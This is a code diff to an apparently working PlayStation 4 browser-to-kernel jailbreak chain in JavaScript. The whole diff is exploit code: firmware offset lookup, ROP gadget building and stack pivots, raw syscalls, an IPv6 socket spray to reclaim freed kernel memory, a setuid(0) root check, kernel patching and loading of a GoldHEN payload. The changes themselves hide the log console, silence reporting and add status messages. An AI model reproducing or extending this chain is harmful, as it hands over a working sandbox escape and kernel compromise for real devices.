@@ -3,18 +3,53 @@ import { installWindowP } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
-const outEl = document.getElementById("out");
-const stateEl = document.getElementById("state");
+function ensureHostConsole() {
+    var out = document.getElementById("out");
+    var st = document.getElementById("state");
+    if (!out) {
+        out = document.createElement("pre");
+        out.id = "out";
+        out.setAttribute(
+            "style",
+            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
+                "overflow:hidden;opacity:0;pointer-events:none;"
+        );
+        (document.body || document.documentElement).appendChild(out);
+    }
+    if (!st) {
+        st = document.createElement("div");
+        st.id = "state";
+        st.setAttribute(
+            "style",
+            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
+                "overflow:hidden;opacity:0;pointer-events:none;"
+        );
+        (document.body || document.documentElement).appendChild(st);
+    }
+    return { outEl: out, stateEl: st };
+}
+var _hostCons = ensureHostConsole();
+const outEl = _hostCons.outEl;
+const stateEl = _hostCons.stateEl;
 const lines = [];
 
+function hostOk() {
+    var m = document.getElementById("msgs");
+    if (m) {
+        m.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
+    }
+}
+
+function hostFail() {
+    var m = document.getElementById("msgs");
+    if (m) {
+        m.innerHTML = "Failed to Load! Restart Your Console ...";
+        m.style.color = "yellow";
+    }
+}
+
 function post(tag, detail) {
-    try {
-        const x = new XMLHttpRequest();
-        x.open("POST", "t", true);
-        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
-             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
-    } catch (e) { }
+    // Silenced for 100% offline execution without WV-33898-1 popup
 }
 
 const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
@@ -56,10 +91,7 @@ function mark(tag, detail) {
 }
 function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
 
-let passCount = 0, failCount = 0;
 function check(name, ok, detail) {
-    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
-    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
     return ok;
 }
 function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
@@ -206,8 +238,6 @@ function makeRpc(worker) {
 
         const fwResolved = offsetsFor(navigator.userAgent);
         const fwKey = fwResolved.key;
-        // off.kpatch wins when a firmware shares another's kernel and therefore
-        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = fwResolved.off && fwResolved.off.kpatch
             ? "slopkit/patches/" + fwResolved.off.kpatch
             : fwKey ? "slopkit/patches/" + fwKey.replace(".", "") + ".bin" : null;
@@ -241,10 +271,7 @@ function makeRpc(worker) {
 
         let payload = null;
         try {
-            let prsp = await fetch("payload.bin").catch(function() { return null; });
-            if (!prsp || !prsp.ok) {
-                prsp = await fetch("goldhen_2.4b18.12.bin");
-            }
+            const prsp = await fetch("goldhen_2.4b18.10.bin");
             if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
         } catch (e) {
             mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
@@ -278,7 +305,15 @@ function makeRpc(worker) {
         const ua = navigator.userAgent;
         const { key, off } = offsetsFor(ua);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) { state("no offsets for this firmware", "bad"); return; }
+        if (!off) {
+            var m = document.getElementById("msgs");
+            if (m) {
+                m.innerHTML = 'No offsets for this firmware: <span style="color: red;">'
+                    + (key || "Unknown") + '</span>';
+            }
+            mark("NO-OFFSETS", key || "unknown");
+            return;
+        }
 
         mark("FW-STATUS", key + " -- " + (off.fw_status
             || "no status recorded in the offsets block."));
@@ -311,9 +346,7 @@ function makeRpc(worker) {
         const g = function (rva) { return webkitBase.add32(rva); };
         const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
-        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
-            state("a base looks wrong", "bad"); return;
-        }
+        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) { throw new Error("a base looks wrong"); }
 
         const GADGETS = [
             ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3], false, true],
@@ -372,11 +405,11 @@ function makeRpc(worker) {
         }
         check("gadget-table-fits-module", !fatal,
             gated + "/" + GADGETS.length + " gated");
-        if (fatal) { state("gadget bytes did not match", "bad"); return; }
+        if (fatal) { throw new Error("gadget bytes did not match"); }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
         check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
-        if (!argGadget[4]) { state("no pop r8", "bad"); return; }
+        if (!argGadget[4]) { throw new Error("no pop r8"); }
 
         const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
         const wanted = [];
@@ -432,7 +465,7 @@ function makeRpc(worker) {
             missing.length === 0,
             missing.length ? "missing: " + missing.join(",")
                 : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
-        if (missing.length) { state("missing syscall stubs", "bad"); return; }
+        if (missing.length) { throw new Error("missing syscall stubs"); }
 
         {
             const got9 = [];
@@ -491,7 +524,7 @@ function makeRpc(worker) {
         }
         const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
         check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
-        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }
+        if (!mainCtx || !wrkCtx) { throw new Error("backing stores failed"); }
 
         function layout(c, insts, targetIdx) {
             c.stackU8.fill(0); c.frameU8.fill(0);
@@ -554,9 +587,7 @@ function makeRpc(worker) {
 
         const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
         origNative = p.read8(mFuncAt);
-        if (!sameI64(origNative, nativeFn)) {
-            state("m_function moved under us", "bad"); return;
-        }
+        if (!sameI64(origNative, nativeFn)) { throw new Error("m_function moved under us"); }
         const mainPivotObj = {};
         keepAlive.push(mainPivotObj);
         mainPivotAddr = p.leakval(mainPivotObj);
@@ -628,9 +659,22 @@ function makeRpc(worker) {
                               mainCtx.frameDv.getUint32(12, true));
         check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
             wit + " want " + mainCtx.P);
-        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
+        if (!sameI64(wit, mainCtx.P)) { throw new Error("pivot failed"); }
         const pid = sc(SYS.getpid).i32;
         mark("PID", String(pid));
+		
+        try {
+            var uid0 = sc(SYS.getuid).i32;
+            var su0 = sc(SYS.setuid, 0).i32;
+            if (uid0 === 0 || su0 === 0) {
+                mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
+                var m = document.getElementById("msgs");
+                if (m) {
+                    m.innerHTML = "GoldHEN is Already Loaded ...";
+                }
+                return;
+            }
+        } catch (e) {}
 
         function alloc(len) {
             const ab = new ArrayBuffer(len);
@@ -697,7 +741,7 @@ function makeRpc(worker) {
         const D = bufAddr(markerArr.buffer);
         if ((p.read4(D) >>> 0) !== SENT_LO) {
             check("transferred-store-worker-memory", false, "D=" + D);
-            state("transfer did not preserve the store", "bad"); return;
+            throw new Error("transfer did not preserve the store");
         }
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
         const storage = p.read8(D.add32(0x10));
@@ -705,7 +749,7 @@ function makeRpc(worker) {
         if (!markerCell || !ptrish(markerCell)) {
             check("walk-reached-worker-marker", false,
                 "storage=" + storage + " cell=" + markerCell);
-            state("walk failed -- run step 4b for the dump", "bad"); return;
+            throw new Error("walk failed");
         }
         const butterfly = p.read8(markerCell.add32(8));
         let wMaster = null, wVictim = null, wLeak = null;
@@ -720,7 +764,7 @@ function makeRpc(worker) {
         }
         check("walk-found-worker-victim-master",
             !!(wMaster && wVictim && wLeak), "master=" + wMaster);
-        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
+        if (!(wMaster && wVictim && wLeak)) { throw new Error("walk failed"); }
         wMasterAddr = wMaster;
         origWorkerVector = p.read8(wMaster.add32(0x10));
         p.write8(wMaster.add32(0x10), wVictim);
@@ -807,7 +851,7 @@ function makeRpc(worker) {
         check("loopback-server-socket-bound-listening",
             br === 0 && lr2 === 0, "bind=" + br + " listen=" + lr2
             + " fd=" + server);
-        if (br !== 0 || lr2 !== 0) { state("could not set up the server", "bad"); }
+        if (br !== 0 || lr2 !== 0) { throw new Error("could not set up the server"); }
 
         const PIPE_SYS = 42, F_SETFL = 4, O_NONBLOCK = 4;
         const FIOSETOWN = 0x8004667c;
@@ -939,9 +983,7 @@ function makeRpc(worker) {
             + "  affinity main=" + ma + " worker=" + wa);
         if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
             mark("REFUSING-TO-ARM", "reason=core-pin-failed");
-            state("could not pin -- refusing to arm", "bad");
-            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-            return;
+            throw new Error("could not pin -- refusing to arm");
         }
 
         const tidBuf = alloc(8);
@@ -958,18 +1000,13 @@ function makeRpc(worker) {
         for (const nm of ["sched_yield", "thr_suspend_ucontext",
                           "thr_resume_ucontext"]) {
             if (!stubAddr.get(SYS[nm])) {
-                check("stub for " + nm, false, "");
                 mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
-                state("missing " + nm, "bad");
-                mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-                return;
+                throw new Error("missing " + nm);
             }
         }
         if (!(wTid !== 0 && wTid !== myTid)) {
             mark("REFUSING-TO-ARM", "reason=no-worker-tid");
-            state("no worker tid", "bad");
-            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-            return;
+            throw new Error("no worker tid");
         }
         check("worker-answers-after-being-pinned",
             (await rpc("ping")) === "pong", "");
@@ -996,10 +1033,8 @@ function makeRpc(worker) {
             ipv6Socks.length + "/" + IPV6_SOCK_NUM
             + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
         if (ipv6Socks.length !== IPV6_SOCK_NUM) {
-            state("cannot stand up the reclaim -- refusing to arm", "bad");
             mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
-            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-            return;
+            throw new Error("cannot stand up the reclaim -- refusing to arm");
         }
 
         function findRthdrTwins(rounds, skipFirstSpray) {
@@ -3501,7 +3536,8 @@ function makeRpc(worker) {
                                                     + "wrote back a thread handle"
                                                     : "returned " + rc);
                                             payloadRunning = launched;
-                                            if (launched)
+                                            if (launched) {
+                                                hostOk();
                                                 mark("PAYLOAD-RUNNING", "bytes="
                                                     + payload.length + " entry="
                                                     + entry);
@@ -3514,6 +3550,9 @@ function makeRpc(worker) {
                                                         "getpid=" + scAny(SYS.getpid).i32
                                                         + " after=" + PAYLOAD_SETTLE + "ms");
                                                 }
+                                            } else {
+                                                hostFail();
+                                            }
                                         } else if (!target) {
                                             mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
                                                 "the payload is at " + entry
@@ -3555,7 +3594,6 @@ function makeRpc(worker) {
             rebootRequired = true;
         }
 
-        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
         if (twins) {
             mark("VERDICT", payloadRunning
                 ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
@@ -3576,16 +3614,19 @@ function makeRpc(worker) {
                 + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
         } else if (committed) {
             state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
-        } else if (failCount === 0) {
-            state("no win in " + attemptsUsed + " attempts", "warn");
+            hostFail();
         } else {
-            state("see log", "bad");
+            state("no win in " + attemptsUsed + " attempts", "warn");
+            hostFail();
         }
 
     } catch (e) {
-        mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
-        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-        state("FAILED -- see log", "bad");
+        mark("FAILED", e && e.message ? e.message : String(e));
+        try {
+            stateEl.textContent = "FAILED -- see log";
+            stateEl.className = "bad";
+        } catch (e2) { }
+        hostFail();
     } finally {
 
         const teardown = !committed || repaired;
@@ -3782,9 +3823,6 @@ function makeRpc(worker) {
             mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
         }
 
-        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
-            + " (incl. teardown)");
-
         const stillDirty = (rebootRequired || committed || committed2)
             && !(repaired && cleanupDone);
         if (stillDirty) {
@@ -3794,6 +3832,9 @@ function makeRpc(worker) {
                 stateEl.textContent = "REBOOT THE CONSOLE";
                 stateEl.className = "bad";
             } catch (e) { }
+            if (!payloadRunning) {
+                hostFail();
+            }
         } else if (repaired && cleanupDone) {
             mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
                 + " chunkY=leaked-0x80 pipes=+1ref-each"
@@ -3808,7 +3849,7 @@ function makeRpc(worker) {
                   + "torn down" + (jailbroken ? ", and the process is root"
                     : "") + ". See the stage 8/9/10 marks for what is left.");
             try {
-                var m = document.getElementById("msgs"); if (m && payloadRunning) { m.innerHTML = "GoldHEN v2.4b18.12 Loaded!"; m.style.color = "#00ff88"; } stateEl.textContent = payloadRunning
+                stateEl.textContent = payloadRunning
                     ? "ALL DONE"
                     : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                     : jailbroken ? "ROOT -- NO REBOOT NEEDED"
